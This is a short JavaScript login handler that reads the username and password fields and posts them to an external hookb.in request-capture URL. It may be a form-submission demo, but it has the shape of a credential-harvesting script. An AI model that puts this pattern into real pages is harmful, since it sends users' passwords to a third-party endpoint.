function doLogin() {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://hookb.in/JK1MVePo1OTg0l990R7j");
  xhr.onload = function () {
    console.info(xhr.responseText);
  };
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  const form = new URLSearchParams();
  form.append("username", document.getElementById("username").value);
  form.append("password", document.getElementById("password").value);

  xhr.send(form);
}

document.getElementById("login").onclick = doLogin;
